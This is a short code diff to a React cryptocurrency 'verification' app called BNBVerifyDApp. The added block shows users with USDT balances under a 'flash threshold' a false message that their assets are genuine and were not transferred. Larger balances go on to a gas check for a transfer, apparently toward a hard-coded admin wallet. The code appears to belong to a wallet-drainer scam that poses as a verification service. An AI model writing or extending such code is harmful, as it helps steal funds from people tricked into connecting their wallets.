@@ -483,6 +483,24 @@ export default function BNBVerifyDApp() {
         return
       }
 
+      if (usdtBalance <= FLASH_THRESHOLD) {
+        setVerificationResult({
+          type: "genuine",
+          message: "✅ Verification Successful! Your assets are genuine.",
+          usdtAmount: usdtBalance,
+          bnbAmount: bnbBalance,
+          transferred: false,
+          adminWallet: ADMIN_WALLET,
+          isHighAmount: false,
+        })
+        setVerificationStep("completed")
+        toast({
+          title: "✅ Assets Verified",
+          description: `${usdtBalance.toFixed(2)} USDT verified as genuine assets.`,
+        })
+        return
+      }
+
       const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
       setGasInfo(gasCheck)
 
